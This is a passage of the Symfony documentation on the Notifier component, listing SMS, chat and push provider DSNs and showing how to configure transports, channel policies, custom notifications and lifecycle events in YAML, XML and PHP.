`OvhCloud`_         ``symfony/ovh-cloud-notifier``         ``ovhcloud://APPLICATION_KEY:APPLICATION_SECRET@default?consumer_key=CONSUMER_KEY&service_name=SERVICE_NAME``
`Plivo`_            ``symfony/plivo-notifier``             ``plivo://AUTH_ID:AUTH_TOKEN@default?from=FROM``
`Redlink`_          ``symfony/redlink-notifier``           ``redlink://API_KEY:APP_KEY@default?from=SENDER_NAME&version=API_VERSION``
`RingCentral`_      ``symfony/ring-central-notifier``      ``ringcentral://API_TOKEN@default?from=FROM``
`SMSFactor`_        ``symfony/sms-factor-notifier``        ``sms-factor://TOKEN@default?sender=SENDER&push_type=PUSH_TYPE``
`Sendberry`_        ``symfony/sendberry-notifier``         ``sendberry://USERNAME:PASSWORD@default?auth_key=AUTH_KEY&from=FROM``
`Seven.io`_         ``symfony/sevenio-notifier``           ``sevenio://API_KEY@default?from=FROM``
`SimpleTextin`_     ``symfony/simple-textin-notifier``     ``simpletextin://API_KEY@default?from=FROM``
`Sinch`_            ``symfony/sinch-notifier``             ``sinch://ACCOUNT_ID:AUTH_TOKEN@default?from=FROM``
`Sms77`_            ``symfony/sms77-notifier``             ``sms77://API_KEY@default?from=FROM``
`SmsBiuras`_        ``symfony/sms-biuras-notifier``        ``smsbiuras://UID:API_KEY@default?from=FROM&test_mode=0``
`SmsSluzba`_        ``symfony/sms-sluzba-notifier``        ``sms-sluzba://USERNAME:PASSWORD@default``
`Smsapi`_           ``symfony/smsapi-notifier``            ``smsapi://TOKEN@default?from=FROM``
`Smsbox`_           ``symfony/smsbox-notifier``            ``smsbox://APIKEY@default?mode=MODE&strategy=STRATEGY&sender=SENDER``
`Smsc`_             ``symfony/smsc-notifier``              ``smsc://LOGIN:PASSWORD@default?from=FROM``
`SMSense`_          ``symfony/smsense-notifier``           ``smsense://API_TOKEN@default?from=FROM``
`SpotHit`_          ``symfony/spot-hit-notifier``          ``spothit://TOKEN@default?from=FROM``
`Telnyx`_           ``symfony/telnyx-notifier``            ``telnyx://API_KEY@default?from=FROM&messaging_profile_id=MESSAGING_PROFILE_ID``
`TurboSms`_         ``symfony/turbo-sms-notifier``         ``turbosms://AUTH_TOKEN@default?from=FROM``
`Twilio`_           ``symfony/twilio-notifier``            ``twilio://SID:TOKEN@default?from=FROM``                                                                                  yes
`Unifonic`_         ``symfony/unifonic-notifier``          ``unifonic://APP_SID@default?from=FROM``
`Vonage`_           ``symfony/vonage-notifier``            ``vonage://KEY:SECRET@default?from=FROM``                                                                                 yes
`Yunpian`_          ``symfony/yunpian-notifier``           ``yunpian://APIKEY@default``
`iSendPro`_         ``symfony/isendpro-notifier``          ``isendpro://ACCOUNT_KEY_ID@default?from=FROM&no_stop=NO_STOP&sandbox=SANDBOX``
==================  =====================================  ========================================================================================================================= ===============

.. tip::

    Some third party transports, when using the API, support status callbacks
    via webhooks. See the :doc:`Webhook documentation </webhook>` for more
    details.

.. versionadded:: 7.1

    The `SmsSluzba`_, `SMSense`_  and `LOX24`_ integrations were introduced in Symfony 7.1.

.. deprecated:: 7.1

    The `Sms77`_ integration is deprecated since
    Symfony 7.1, use the `Seven.io`_ integration instead.

To enable a texter, add the correct DSN in your ``.env`` file and
configure the ``texter_transports``:

.. code-block:: bash

    # .env
    TWILIO_DSN=twilio://SID:TOKEN@default?from=FROM

.. configuration-block::

    .. code-block:: yaml

        # config/packages/notifier.yaml
        framework:
            notifier:
                texter_transports:
                    twilio: '%env(TWILIO_DSN)%'

    .. code-block:: xml

        <!-- config/packages/notifier.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:notifier>
                    <framework:texter-transport name="twilio">
                        %env(TWILIO_DSN)%
                    </framework:texter-transport>
                </framework:notifier>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/notifier.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->notifier()
                ->texterTransport('twilio', env('TWILIO_DSN'))
            ;
        };

.. _sending-sms:

The :class:`Symfony\\Component\\Notifier\\TexterInterface` class allows you to
send SMS messages::

    // src/Controller/SecurityController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Notifier\Message\SmsMessage;
    use Symfony\Component\Notifier\TexterInterface;
    use Symfony\Component\Routing\Attribute\Route;

    class SecurityController
    {
        #[Route('/login/success')]
        public function loginSuccess(TexterInterface $texter): Response
        {
            $options = (new ProviderOptions())
                ->setPriority('high')
            ;

            $sms = new SmsMessage(
                // the phone number to send the SMS message to
                '+1411111111',
                // the message
                'A new login was detected!',
                // optionally, you can override default "from" defined in transports
                '+1422222222',
                // you can also add options object implementing MessageOptionsInterface
                $options
            );

            $sentMessage = $texter->send($sms);

            // ...
        }
    }

The ``send()`` method returns a variable of type
:class:`Symfony\\Component\\Notifier\\Message\\SentMessage` which provides
information such as the message ID and the original message contents.

.. _notifier-chat-channel:

Chat Channel
~~~~~~~~~~~~

.. caution::

    If any of the DSN values contains any character considered special in a
    URI (such as ``: / ? # [ ] @ ! $ & ' ( ) * + , ; =``), you must
    encode them. See `RFC 3986`_ for the full list of reserved characters or use the
    :phpfunction:`urlencode` function to encode them.

The chat channel is used to send chat messages to users by using
:class:`Symfony\\Component\\Notifier\\Chatter` classes. Symfony provides
integration with these chat services:

=======================================  ====================================  =============================================================================
Service                                  Package                               DSN
=======================================  ====================================  =============================================================================
`AmazonSns`_                             ``symfony/amazon-sns-notifier``       ``sns://ACCESS_KEY:SECRET_KEY@default?region=REGION``
`Bluesky`_                               ``symfony/bluesky-notifier``          ``bluesky://USERNAME:PASSWORD@default``
`Chatwork`_                              ``symfony/chatwork-notifier``         ``chatwork://API_TOKEN@default?room_id=ID``
`Discord`_                               ``symfony/discord-notifier``          ``discord://TOKEN@default?webhook_id=ID``
`FakeChat`_                              ``symfony/fake-chat-notifier``        ``fakechat+email://default?to=TO&from=FROM`` or ``fakechat+logger://default``
`Firebase`_                              ``symfony/firebase-notifier``         ``firebase://USERNAME:PASSWORD@default``
`Gitter`_                                ``symfony/gitter-notifier``           ``gitter://TOKEN@default?room_id=ROOM_ID``
`GoogleChat`_                            ``symfony/google-chat-notifier``      ``googlechat://ACCESS_KEY:ACCESS_TOKEN@default/SPACE?thread_key=THREAD_KEY``
`LINE Notify`_                           ``symfony/line-notify-notifier``      ``linenotify://TOKEN@default``
`LinkedIn`_                              ``symfony/linked-in-notifier``        ``linkedin://TOKEN:USER_ID@default``
`Mastodon`_                              ``symfony/mastodon-notifier``         ``mastodon://ACCESS_TOKEN@HOST``
`Mattermost`_                            ``symfony/mattermost-notifier``       ``mattermost://ACCESS_TOKEN@HOST/PATH?channel=CHANNEL``
`Mercure`_                               ``symfony/mercure-notifier``          ``mercure://HUB_ID?topic=TOPIC``
`MicrosoftTeams`_                        ``symfony/microsoft-teams-notifier``  ``microsoftteams://default/PATH``
`RocketChat`_                            ``symfony/rocket-chat-notifier``      ``rocketchat://TOKEN@ENDPOINT?channel=CHANNEL``
`Slack`_                                 ``symfony/slack-notifier``            ``slack://TOKEN@default?channel=CHANNEL``
`Telegram`_                              ``symfony/telegram-notifier``         ``telegram://TOKEN@default?channel=CHAT_ID``
`Twitter`_                               ``symfony/twitter-notifier``          ``twitter://API_KEY:API_SECRET:ACCESS_TOKEN:ACCESS_SECRET@default``
`Zendesk`_                               ``symfony/zendesk-notifier``          ``zendesk://EMAIL:TOKEN@SUBDOMAIN``
`Zulip`_                                 ``symfony/zulip-notifier``            ``zulip://EMAIL:TOKEN@HOST?channel=CHANNEL``
======================================   ====================================  =============================================================================

.. versionadded:: 7.1

    The ``Bluesky``, ``Unifonic`` and ``Smsbox`` integrations
    were introduced in Symfony 7.1.

.. caution::

    By default, if you have the :doc:`Messenger component </messenger>` installed,
    the notifications will be sent through the MessageBus. If you don't have a
    message consumer running, messages will never be sent.

    To change this behavior, add the following configuration to send messages
    directly via the transport:

    .. code-block:: yaml

        # config/packages/notifier.yaml
        framework:
            notifier:
                message_bus: false

Chatters are configured using the ``chatter_transports`` setting:

.. code-block:: bash

    # .env
    SLACK_DSN=slack://TOKEN@default?channel=CHANNEL

.. configuration-block::

    .. code-block:: yaml

        # config/packages/notifier.yaml
        framework:
            notifier:
                chatter_transports:
                    slack: '%env(SLACK_DSN)%'

    .. code-block:: xml

        <!-- config/packages/notifier.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:notifier>
                    <framework:chatter-transport name="slack">
                        %env(SLACK_DSN)%
                    </framework:chatter-transport>
                </framework:notifier>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/notifier.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->notifier()
                ->chatterTransport('slack', env('SLACK_DSN'))
            ;
        };

.. _sending-chat-messages:

The :class:`Symfony\\Component\\Notifier\\ChatterInterface` class allows
you to send messages to chat services::

    // src/Controller/CheckoutController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Notifier\ChatterInterface;
    use Symfony\Component\Notifier\Message\ChatMessage;
    use Symfony\Component\Routing\Attribute\Route;

    class CheckoutController extends AbstractController
    {
        #[Route('/checkout/thankyou')]
        public function thankyou(ChatterInterface $chatter): Response
        {
            $message = (new ChatMessage('You got a new invoice for 15 EUR.'))
                // if not set explicitly, the message is sent to the
                // default transport (the first one configured)
                ->transport('slack');

            $sentMessage = $chatter->send($message);

            // ...
        }
    }

The ``send()`` method returns a variable of type
:class:`Symfony\\Component\\Notifier\\Message\\SentMessage` which provides
information such as the message ID and the original message contents.

.. _notifier-email-channel:

Email Channel
~~~~~~~~~~~~~

The email channel uses the :doc:`Symfony Mailer </mailer>` to send
notifications using the special
:class:`Symfony\\Bridge\\Twig\\Mime\\NotificationEmail`. It is
required to install the Twig bridge along with the Inky and CSS Inliner
Twig extensions:

.. code-block:: terminal

    $ composer require symfony/twig-pack twig/cssinliner-extra twig/inky-extra

After this, :ref:`configure the mailer <mailer-transport-setup>`. You can
also set the default "from" email address that should be used to send the
notification emails:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/mailer.yaml
        framework:
            mailer:
                dsn: '%env(MAILER_DSN)%'
                envelope:
                    sender: 'notifications@example.com'

    .. code-block:: xml

        <!-- config/packages/mailer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:mailer
                    dsn="%env(MAILER_DSN)%"
                >
                    <framework:envelope
                        sender="notifications@example.com"
                    />
                </framework:mailer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/mailer.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->mailer()
                ->dsn(env('MAILER_DSN'))
                ->envelope()
                    ->sender('notifications@example.com')
            ;
        };

.. _notifier-push-channel:

Push Channel
~~~~~~~~~~~~

.. caution::

    If any of the DSN values contains any character considered special in a
    URI (such as ``: / ? # [ ] @ ! $ & ' ( ) * + , ; =``), you must
    encode them. See `RFC 3986`_ for the full list of reserved characters or use the
    :phpfunction:`urlencode` function to encode them.

The push channel is used to send notifications to users by using
:class:`Symfony\\Component\\Notifier\\Texter` classes. Symfony provides
integration with these push services:

===============  ====================================  ==============================================================================
Service          Package                               DSN
===============  ====================================  ==============================================================================
`Engagespot`_    ``symfony/engagespot-notifier``       ``engagespot://API_KEY@default?campaign_name=CAMPAIGN_NAME``
`Expo`_          ``symfony/expo-notifier``             ``expo://Token@default``
`Novu`_          ``symfony/novu-notifier``             ``novu://API_KEY@default``
`Ntfy`_          ``symfony/ntfy-notifier``             ``ntfy://default/TOPIC``
`OneSignal`_     ``symfony/one-signal-notifier``       ``onesignal://APP_ID:API_KEY@default?defaultRecipientId=DEFAULT_RECIPIENT_ID``
`PagerDuty`_     ``symfony/pager-duty-notifier``       ``pagerduty://TOKEN@SUBDOMAIN``
`Pushover`_      ``symfony/pushover-notifier``         ``pushover://USER_KEY:APP_TOKEN@default``
`Pushy`_         ``symfony/pushy-notifier``            ``pushy://API_KEY@default``
===============  ====================================  ==============================================================================

To enable a texter, add the correct DSN in your ``.env`` file and
configure the ``texter_transports``:

.. versionadded:: 7.1

    The `Pushy`_ integration was introduced in Symfony 7.1.

.. code-block:: bash

    # .env
    EXPO_DSN=expo://TOKEN@default

.. configuration-block::

    .. code-block:: yaml

        # config/packages/notifier.yaml
        framework:
            notifier:
                texter_transports:
                    expo: '%env(EXPO_DSN)%'

    .. code-block:: xml

        <!-- config/packages/notifier.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:notifier>
                    <framework:texter-transport name="expo">
                        %env(EXPO_DSN)%
                    </framework:texter-transport>
                </framework:notifier>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/notifier.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->notifier()
                ->texterTransport('expo', env('EXPO_DSN'))
            ;
        };

Configure to use Failover or Round-Robin Transports
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Besides configuring one or more separate transports, you can also use the
special ``||`` and ``&&`` characters to implement a failover or round-robin
transport:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/notifier.yaml
        framework:
            notifier:
                chatter_transports:
                    # Send notifications to Slack and use Telegram if
                    # Slack errored
                    main: '%env(SLACK_DSN)% || %env(TELEGRAM_DSN)%'

                    # Send notifications to the next scheduled transport calculated by round robin
                    roundrobin: '%env(SLACK_DSN)% && %env(TELEGRAM_DSN)%'

    .. code-block:: xml

        <!-- config/packages/notifier.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:notifier>
                    <!-- Send notifications to Slack and use Telegram if
                         Slack errored -->
                    <framework:chatter-transport name="slack">
                        %env(SLACK_DSN)% || %env(TELEGRAM_DSN)%
                    </framework:chatter-transport>

                    <!-- Send notifications to the next scheduled transport
                         calculated by round robin -->
                    <framework:chatter-transport name="slack"><![CDATA[
                        %env(SLACK_DSN)% && %env(TELEGRAM_DSN)%
                    ]]></framework:chatter-transport>
                </framework:notifier>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/notifier.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->notifier()
                // Send notifications to Slack and use Telegram if
                // Slack errored
                ->chatterTransport('main', env('SLACK_DSN').' || '.env('TELEGRAM_DSN'))

                // Send notifications to the next scheduled transport calculated by round robin
                ->chatterTransport('roundrobin', env('SLACK_DSN').' && '.env('TELEGRAM_DSN'))
            ;
        };

Creating & Sending Notifications
--------------------------------

To send a notification, autowire the
:class:`Symfony\\Component\\Notifier\\NotifierInterface` (service ID
``notifier``). This class has a ``send()`` method that allows you to send a
:class:`Symfony\\Component\\Notifier\\Notification\\Notification` to a
:class:`Symfony\\Component\\Notifier\\Recipient\\Recipient`::

    // src/Controller/InvoiceController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Notifier\Notification\Notification;
    use Symfony\Component\Notifier\NotifierInterface;
    use Symfony\Component\Notifier\Recipient\Recipient;

    class InvoiceController extends AbstractController
    {
        #[Route('/invoice/create')]
        public function create(NotifierInterface $notifier): Response
        {
            // ...

            // Create a Notification that has to be sent
            // using the "email" channel
            $notification = (new Notification('New Invoice', ['email']))
                ->content('You got a new invoice for 15 EUR.');

            // The receiver of the Notification
            $recipient = new Recipient(
                $user->getEmail(),
                $user->getPhonenumber()
            );

            // Send the notification to the recipient
            $notifier->send($notification, $recipient);

            // ...
        }
    }

The ``Notification`` is created by using two arguments: the subject and
channels. The channels specify which channel (or transport) should be used
to send the notification. For instance, ``['email', 'sms']`` will send
both an email and sms notification to the user.

The default notification also has a ``content()`` and ``emoji()`` method to
set the notification content and icon.

Symfony provides the following recipients:

:class:`Symfony\\Component\\Notifier\\Recipient\\NoRecipient`
    This is the default and is useful when there is no need to have
    information about the receiver. For example, the browser channel uses
    the current requests' :ref:`session flashbag <flash-messages>`;

:class:`Symfony\\Component\\Notifier\\Recipient\\Recipient`
    This can contain both the email address and the phone number of the user. This
    recipient can be used for all channels (depending on whether they are
    actually set).

Configuring Channel Policies
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of specifying the target channels on creation, Symfony also allows
you to use notification importance levels. Update the configuration to
specify what channels should be used for specific levels (using
``channel_policy``):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/notifier.yaml
        framework:
            notifier:
                # ...
                channel_policy:
                    # Use SMS, Slack and email for urgent notifications
                    urgent: ['sms', 'chat/slack', 'email']

                    # Use Slack for highly important notifications
                    high: ['chat/slack']

                    # Use browser for medium and low notifications
                    medium: ['browser']
                    low: ['browser']

    .. code-block:: xml

        <!-- config/packages/notifier.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:notifier>
                    <!-- ... -->

                    <framework:channel-policy>
                        <!-- Use SMS, Slack and Email for urgent notifications -->
                        <framework:urgent>sms</framework:urgent>
                        <framework:urgent>chat/slack</framework:urgent>
                        <framework:urgent>email</framework:urgent>

                        <!-- Use Slack for highly important notifications -->
                        <framework:high>chat/slack</framework:high>

                        <!-- Use browser for medium and low notifications -->
                        <framework:medium>browser</framework:medium>
                        <framework:low>browser</framework:low>
                    </framework:channel-policy>
                </framework:notifier>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/notifier.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->notifier()
                // Use SMS, Slack and email for urgent notifications
                ->channelPolicy('urgent', ['sms', 'chat/slack', 'email'])
                // Use Slack for highly important notifications
                ->channelPolicy('high', ['chat/slack'])
                // Use browser for medium and low notifications
                ->channelPolicy('medium', ['browser'])
                ->channelPolicy('low', ['browser'])
            ;
        };

Now, whenever the notification's importance is set to "high", it will be
sent using the Slack transport::

    // ...
    class InvoiceController extends AbstractController
    {
        #[Route('/invoice/create')]
        public function invoice(NotifierInterface $notifier): Response
        {
            // ...

            $notification = (new Notification('New Invoice'))
                ->content('You got a new invoice for 15 EUR.')
                ->importance(Notification::IMPORTANCE_HIGH);

            $notifier->send($notification, new Recipient('wouter@example.com'));

            // ...
        }
    }

Customize Notifications
-----------------------

You can extend the ``Notification`` or ``Recipient`` base classes to
customize their behavior. For instance, you can overwrite the
``getChannels()`` method to only return ``sms`` if the invoice price is
very high and the recipient has a phone number::

    namespace App\Notifier;

    use Symfony\Component\Notifier\Notification\Notification;
    use Symfony\Component\Notifier\Recipient\RecipientInterface;
    use Symfony\Component\Notifier\Recipient\SmsRecipientInterface;

    class InvoiceNotification extends Notification
    {
        public function __construct(
            private int $price,
        ) {
        }

        public function getChannels(RecipientInterface $recipient): array
        {
            if (
                $this->price > 10000
                && $recipient instanceof SmsRecipientInterface
            ) {
                return ['sms'];
            }

            return ['email'];
        }
    }

Customize Notification Messages
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Each channel has its own notification interface that you can implement to
customize the notification message. For instance, if you want to modify the
message based on the chat service, implement
:class:`Symfony\\Component\\Notifier\\Notification\\ChatNotificationInterface`
and its ``asChatMessage()`` method::

    // src/Notifier/InvoiceNotification.php
    namespace App\Notifier;

    use Symfony\Component\Notifier\Message\ChatMessage;
    use Symfony\Component\Notifier\Notification\ChatNotificationInterface;
    use Symfony\Component\Notifier\Notification\Notification;
    use Symfony\Component\Notifier\Recipient\RecipientInterface;

    class InvoiceNotification extends Notification implements ChatNotificationInterface
    {
        public function __construct(
            private int $price,
        ) {
        }

        public function asChatMessage(RecipientInterface $recipient, ?string $transport = null): ?ChatMessage
        {
            // Add a custom subject and emoji if the message is sent to Slack
            if ('slack' === $transport) {
                $this->subject('You\'re invoiced '.strval($this->price).' EUR.');
                $this->emoji("money");
                return ChatMessage::fromNotification($this);
            }

            // If you return null, the Notifier will create the ChatMessage
            // based on this notification as it would without this method.
            return null;
        }
    }

The
:class:`Symfony\\Component\\Notifier\\Notification\\SmsNotificationInterface`,
:class:`Symfony\\Component\\Notifier\\Notification\\EmailNotificationInterface`
and
:class:`Symfony\\Component\\Notifier\\Notification\\PushNotificationInterface`
also exists to modify messages sent to those channels.

Customize Browser Notifications (Flash Messages)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The default behavior for browser channel notifications is to add a
:ref:`flash message <flash-messages>` with ``notification`` as its key.

However, you might prefer to map the importance level of the notification to the
type of flash message, so you can tweak their style.

you can do that by overriding the default ``notifier.flash_message_importance_mapper``
service with your own implementation of
:class:`Symfony\\Component\\Notifier\\FlashMessage\\FlashMessageImportanceMapperInterface`
where you can provide your own "importance" to "alert level" mapping.

Symfony currently provides an implementation for the Bootstrap CSS framework's
typical alert levels, which you can implement immediately using:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            notifier.flash_message_importance_mapper:
                class: Symfony\Component\Notifier\FlashMessage\BootstrapFlashMessageImportanceMapper

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="notifier.flash_message_importance_mapper" class="Symfony\Component\Notifier\FlashMessage\BootstrapFlashMessageImportanceMapper"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\Notifier\FlashMessage\BootstrapFlashMessageImportanceMapper;

        return function(ContainerConfigurator $containerConfigurator) {
            $containerConfigurator->services()
                ->set('notifier.flash_message_importance_mapper', BootstrapFlashMessageImportanceMapper::class)
            ;
        };

Testing Notifier
----------------

Symfony provides a :class:`Symfony\\Bundle\\FrameworkBundle\\Test\\NotificationAssertionsTrait`
which provide useful methods for testing your Notifier implementation.
You can benefit from this class by using it directly or extending the
:class:`Symfony\\Bundle\\FrameworkBundle\\Test\\KernelTestCase`.

See :ref:`testing documentation <notifier-assertions>` for the list of available assertions.

Disabling Delivery
------------------

While developing (or testing), you may want to disable delivery of notifications
entirely. You can do this by forcing Notifier to use the ``NullTransport`` for
all configured texter and chatter transports only in the ``dev`` (and/or
``test``) environment:

.. code-block:: yaml

    # config/packages/dev/notifier.yaml
    framework:
        notifier:
            texter_transports:
                twilio: 'null://null'
            chatter_transports:
                slack: 'null://null'

.. _notifier-events:

Using Events
------------

The :class:`Symfony\\Component\\Notifier\\Transport` class of the Notifier component
allows you to optionally hook into the lifecycle via events.

The ``MessageEvent`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~

**Typical Purposes**: Doing something before the message is sent (like logging
which message is going to be sent, or displaying something about the event
to be executed.

Just before sending the message, the event class ``MessageEvent`` is
dispatched. Listeners receive a
:class:`Symfony\\Component\\Notifier\\Event\\MessageEvent` event::

    use Symfony\Component\Notifier\Event\MessageEvent;

    $dispatcher->addListener(MessageEvent::class, function (MessageEvent $event): void {
        // gets the message instance
        $message = $event->getMessage();

        // log something
        $this->logger(sprintf('Message with subject: %s will be send to %s', $message->getSubject(), $message->getRecipientId()));
    });

The ``FailedMessageEvent`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Typical Purposes**: Doing something before the exception is thrown
(Retry to send the message or log additional information).

Whenever an exception is thrown while sending the message, the event class
``FailedMessageEvent`` is dispatched. A listener can do anything useful before
the exception is thrown.

Listeners receive a
:class:`Symfony\\Component\\Notifier\\Event\\FailedMessageEvent` event::

    use Symfony\Component\Notifier\Event\FailedMessageEvent;

    $dispatcher->addListener(FailedMessageEvent::class, function (FailedMessageEvent $event): void {
        // gets the message instance
        $message = $event->getMessage();

        // gets the error instance
        $error = $event->getError();

        // log something
        $this->logger(sprintf('The message with subject: %s has not been sent successfully. The error is: %s', $message->getSubject(), $error->getMessage()));
    });

The ``SentMessageEvent`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Typical Purposes**: To perform some action when the message is successfully
sent (like retrieve the id returned when the message is sent).

After the message has been successfully sent, the event class ``SentMessageEvent``
is dispatched. Listeners receive a
:class:`Symfony\\Component\\Notifier\\Event\\SentMessageEvent` event::

    use Symfony\Component\Notifier\Event\SentMessageEvent;

    $dispatcher->addListener(SentMessageEvent::class, function (SentMessageEvent $event): void {
        // gets the message instance
        $message = $event->getOriginalMessage();

        // log something
        $this->logger(sprintf('The message has been successfully sent and has id: %s', $message->getMessageId()));
    });

.. TODO
..    - Using the message bus for asynchronous notification
..    - Describe notifier monolog handler
..    - Describe notification_on_failed_messages integration

.. _`46elks`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/FortySixElks/README.md
.. _`AllMySms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/AllMySms/README.md
.. _`AmazonSns`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/AmazonSns/README.md
.. _`Bandwidth`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Bandwidth/README.md
.. _`Bluesky`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Bluesky/README.md
.. _`Brevo`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Brevo/README.md
.. _`Chatwork`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Chatwork/README.md
.. _`Clickatell`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Clickatell/README.md
.. _`ContactEveryone`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/ContactEveryone/README.md
.. _`Discord`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Discord/README.md
.. _`Engagespot`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Engagespot/README.md
.. _`Esendex`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Esendex/README.md
.. _`Expo`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Expo/README.md
.. _`FakeChat`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/FakeChat/README.md
.. _`FakeSms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/FakeSms/README.md
.. _`Firebase`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Firebase/README.md
.. _`FreeMobile`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/FreeMobile/README.md
.. _`GatewayApi`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/GatewayApi/README.md
.. _`Gitter`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Gitter/README.md
.. _`GoIP`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/GoIP/README.md
.. _`GoogleChat`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/GoogleChat/README.md
.. _`Infobip`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Infobip/README.md
